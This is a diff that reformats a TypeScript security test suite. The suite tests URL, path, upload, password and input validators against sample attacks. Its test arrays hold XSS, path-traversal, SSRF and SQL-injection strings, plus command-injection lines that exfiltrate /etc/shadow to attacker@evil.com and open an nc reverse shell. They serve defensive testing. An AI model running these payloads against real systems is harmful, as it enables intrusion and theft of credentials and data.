@@ -1,7 +1,7 @@
-import { describe, it, expect, beforeEach, afterEach } from 'bun:test';
+import { afterEach, beforeEach, describe, expect, it } from 'bun:test';
+import { spawnSync } from 'child_process';
 import * as fs from 'fs';
 import * as path from 'path';
-import { spawnSync } from 'child_process';
 
 // Security-focused test suite
 describe('Security Tests', () => {
@@ -12,7 +12,7 @@ describe('Security Tests', () => {
         'javascript:alert("XSS")',
         '"><img src=x onerror=alert("XSS")>',
         'javascript://%0Aalert(document.cookie)',
-        '<svg onload=alert("XSS")>'
+        '<svg onload=alert("XSS")>',
       ];
 
       for (const input of maliciousInputs) {
@@ -30,7 +30,7 @@ describe('Security Tests', () => {
         '../../../etc/passwd',
         '..\\..\\..\\windows\\system32\\config\\sam',
         '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
-        '../../../../../../../proc/self/environ'
+        '../../../../../../../proc/self/environ',
       ];
 
       for (const path of maliciousPaths) {
@@ -43,7 +43,7 @@ describe('Security Tests', () => {
       const maliciousUrls = [
         'http://169.254.169.254/latest/meta-data/', // AWS metadata
         'file:///etc/passwd',
-        'ftp://internal.company.com/secrets'
+        'ftp://internal.company.com/secrets',
       ];
 
       for (const url of maliciousUrls) {
@@ -55,7 +55,7 @@ describe('Security Tests', () => {
       const validUrls = [
         'https://example.com',
         'https://api.service.com/data',
-        'https://cdn.example.com/assets'
+        'https://cdn.example.com/assets',
       ];
 
       for (const url of validUrls) {
@@ -68,9 +68,9 @@ describe('Security Tests', () => {
   describe('CSP and Security Headers', () => {
     it('should have proper Content Security Policy headers', () => {
       const cspHeader = getCSPHeader();
-      expect(cspHeader).toContain('default-src \'self\'');
-      expect(cspHeader).toContain('script-src \'self\'');
-      expect(cspHeader).toContain('style-src \'self\'');
+      expect(cspHeader).toContain("default-src 'self'");
+      expect(cspHeader).toContain("script-src 'self'");
+      expect(cspHeader).toContain("style-src 'self'");
       expect(cspHeader).not.toContain('script-src *');
       expect(cspHeader).not.toContain('unsafe-eval');
     });
@@ -91,7 +91,7 @@ describe('Security Tests', () => {
         '/etc/passwd',
         '/proc/self/environ',
         '/sys/kernel/profiling',
-        'C:\\Windows\\System32\\config\\SAM'
+        'C:\\Windows\\System32\\config\\SAM',
       ];
 
       for (const restrictedPath of restrictedPaths) {
@@ -105,7 +105,7 @@ describe('Security Tests', () => {
         { name: 'malicious.exe', type: 'application/x-msdownload', size: 1024 },
         { name: 'script.php', type: 'text/php', size: 512 },
         { name: 'payload.hta', type: 'application/hta', size: 256 },
-        { name: 'virus.bat', type: 'application/bat', size: 128 }
+        { name: 'virus.bat', type: 'application/bat', size: 128 },
       ];
 
       for (const file of maliciousFiles) {
@@ -122,7 +122,7 @@ describe('Security Tests', () => {
         '123456',
         'admin',
         'qwerty',
-        'password123'
+        'password123',
       ];
 
       for (const pwd of weakPasswords) {
@@ -134,7 +134,7 @@ describe('Security Tests', () => {
         'Str0ngP@ssw0rd!',
         'My$3cur3P@ss!',
         'C0mpl3x!P@ssw0rd',
-        'S3cur3!T3st!2023'
+        'S3cur3!T3st!2023',
       ];
 
       for (const pwd of strongPasswords) {
@@ -159,7 +159,7 @@ describe('Security Tests', () => {
         "' OR '1'='1",
         "'; EXEC xp_cmdshell 'dir'; --",
         "' UNION SELECT password FROM users --",
-        "'; WAITFOR DELAY '00:00:10' --"
+        "'; WAITFOR DELAY '00:00:10' --",
       ];
 
       for (const query of maliciousQueries) {
@@ -186,7 +186,7 @@ describe('Security Tests', () => {
         'ls -la && rm -rf /',
         'ping $(whoami).evil.com',
         'cat /etc/shadow | mail attacker@evil.com',
-        'nc -e /bin/sh 10.0.0.1 4444'
+        'nc -e /bin/sh 10.0.0.1 4444',
       ];
 
       for (const cmd of maliciousCommands) {
@@ -228,7 +228,7 @@ describe('Security Tests', () => {
           /AWS_SECRET_ACCESS_KEY.*=.*['"][A-Za-z0-9/+]{40}['"]/,
           /SECRET_KEY.*=.*['"].*['"]/,
           /DATABASE_URL.*=.*['"].*['"]/,
-          /API_KEY.*=.*['"].*['"]/
+          /API_KEY.*=.*['"].*['"]/,
         ];
 
         for (const secretPattern of secrets) {
@@ -252,7 +252,7 @@ describe('Security Tests', () => {
         'execute-arbitrary-code',
         'access-file-system',
         'modify-registry',
-        'spawn-process'
+        'spawn-process',
       ];
 
       for (const channel of maliciousChannels) {
@@ -283,7 +283,13 @@ function validateUrl(url: string): boolean {
     const parsedUrl = new URL(url);
     // Block localhost/internal IPs
     const hostname = parsedUrl.hostname;
-    if (hostname === 'localhost' || hostname === '127.0.0.1' || hostname.startsWith('192.168.') || hostname.startsWith('10.') || hostname.startsWith('172.')) {
+    if (
+      hostname === 'localhost' ||
+      hostname === '127.0.0.1' ||
+      hostname.startsWith('192.168.') ||
+      hostname.startsWith('10.') ||
+      hostname.startsWith('172.')
+    ) {
       return false;
     }
     // Block AWS metadata service
@@ -297,7 +303,10 @@ function validateUrl(url: string): boolean {
     // Allow HTTPS and HTTP protocols to external domains
     if (parsedUrl.protocol === 'https:' || parsedUrl.protocol === 'http:') {
       // Check if it's a public domain (not IP or localhost)
-      const isPublicDomain = /^[a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9](\.[a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9])*$/g.test(hostname);
+      const isPublicDomain =
+        /^[a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9](\.[a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9])*$/g.test(
+          hostname
+        );
       return isPublicDomain;
     }
     return false;
@@ -316,7 +325,7 @@ function getSecurityHeaders(): Record<string, string> {
     'X-Content-Type-Options': 'nosniff',
     'X-Frame-Options': 'DENY',
     'X-XSS-Protection': '1; mode=block',
-    'Strict-Transport-Security': 'max-age=31536000; includeSubDomains'
+    'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
   };
 }
 
@@ -327,28 +336,45 @@ function canAccessFile(filePath: string): boolean {
     '/etc/passwd',
     '/proc/self/environ',
     '/sys/kernel/profiling',
-    'C:\\Windows\\System32\\config\\SAM'
+    'C:\\Windows\\System32\\config\\SAM',
   ];
 
   return !sensitivePaths.some(path => filePath.includes(path));
 }
 
-function validateUpload(file: { name: string; type: string; size: number }): boolean {
-  const allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'application/pdf'];
+function validateUpload(file: {
+  name: string;
+  type: string;
+  size: number;
+}): boolean {
+  const allowedTypes = [
+    'image/jpeg',
+    'image/png',
+    'image/gif',
+    'application/pdf',
+  ];
   const allowedExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.pdf'];
-  
+
   const ext = path.extname(file.name).toLowerCase();
-  return allowedTypes.includes(file.type) && allowedExtensions.includes(ext) && file.size < 10 * 1024 * 1024; // < 10MB
+  return (
+    allowedTypes.includes(file.type) &&
+    allowedExtensions.includes(ext) &&
+    file.size < 10 * 1024 * 1024
+  ); // < 10MB
 }
 
 function validatePassword(password: string): boolean {
   // At least 8 chars, 1 upper, 1 lower, 1 number, 1 special char
-  const strongPasswordRegex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{8,}$/;
+  const strongPasswordRegex =
+    /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{8,}$/;
   return strongPasswordRegex.test(password);
 }
 
 function generateSessionId(): string {
-  return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+  return (
+    Math.random().toString(36).substring(2, 15) +
+    Math.random().toString(36).substring(2, 15)
+  );
 }
 
 function regenerateSessionId(oldId: string): string {
@@ -398,23 +424,27 @@ function getSourceFiles(): string[] {
   // Get all source files to scan for secrets
   const sourceDir = './src';
   const files: string[] = [];
-  
+
   function walk(dir: string) {
     const dirents = fs.readdirSync(dir, { withFileTypes: true });
     for (const dirent of dirents) {
       const res = path.join(dir, dirent.name);
       if (dirent.isDirectory()) {
         walk(res);
-      } else if (res.endsWith('.ts') || res.endsWith('.js') || res.endsWith('.json')) {
+      } else if (
+        res.endsWith('.ts') ||
+        res.endsWith('.js') ||
+        res.endsWith('.json')
+      ) {
         files.push(res);
       }
     }
   }
-  
+
   if (fs.existsSync(sourceDir)) {
     walk(sourceDir);
   }
-  
+
   return files;
 }
 
@@ -425,8 +455,8 @@ function getElectronConfig(): any {
       nodeIntegration: false,
       contextIsolation: true,
       sandbox: true,
-      webSecurity: true
-    }
+      webSecurity: true,
+    },
   };
 }
 
